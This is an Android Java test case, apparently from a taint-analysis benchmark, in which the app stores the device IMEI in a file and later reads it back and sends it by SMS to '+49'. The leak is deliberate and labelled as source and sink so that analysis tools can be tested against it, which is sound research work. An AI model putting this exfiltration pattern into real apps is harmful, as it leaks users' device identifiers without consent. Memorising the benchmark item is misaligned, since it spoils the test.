package de.ecspride;

import java.io.FileInputStream;
import java.io.FileOutputStream;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @testcase_name PrivateDataLeak3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description The IMEI is written into a file, read out again and then leaked.
 * @dataflow OnCreate: source -> imei -> file -> imei -> sink
 * @number_of_leaks 2
 * @challenges The analysis must propagate taints across file system accesses,
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		String imei = telephonyManager.getDeviceId(); //source

		try {
			FileOutputStream fos = openFileOutput("out.txt", Context.MODE_PRIVATE);
			fos.write(imei.getBytes());
			fos.close();
		}
		catch (Exception ex) {
			
		}
	}
	
	@Override
	protected void onResume() {
		super.onResume();
		
		try {
			FileInputStream fis = openFileInput("out.txt");
			byte[] buf = new byte[256];
			for (int i = 0; i < buf.length; i++)
				buf[i] = '\0';
			fis.read(buf);
			fis.close();
			
	    	SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49", null, new String(buf).trim(), null, null);  //sink, leak
		}
		catch (Exception ex) {
			
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
